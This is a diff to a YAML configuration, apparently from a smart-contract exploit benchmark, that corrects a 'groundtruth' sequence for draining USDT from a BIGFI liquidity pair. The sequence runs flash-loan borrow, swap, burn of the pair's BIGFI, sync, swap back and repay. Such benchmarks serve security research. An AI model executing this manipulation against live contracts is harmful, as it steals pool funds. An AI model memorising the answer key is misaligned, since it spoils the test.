@@ -21,7 +21,7 @@ ctrt_name2deploy:
 
 extra_actions:
   - "function burn_pair_bigfi(uint256 amount) internal {
-    bigfi.burn(amount);
+    bigfi.burn(address(pair), amount);
     }"
 
 extra_deployments: []
@@ -33,7 +33,8 @@ attack_goal: "usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker"
 groundtruth:
   - ["borrow", "usdt", "200000e18"]
   - ["swap", "pair", "usdt", "bigfi", "usdt.balanceOf(attacker)"]
-  - ["burn", "pair", "bigfi", "20999908387035301038233287"]
+  - ["burn", "pair", "bigfi", "3260e18"]
+  - ["sync", "pair"]
   - ["swap", "pair", "bigfi", "usdt", "bigfi.balanceOf(attacker)"]
   - ["payback", "usdt", "200600e18"]
 
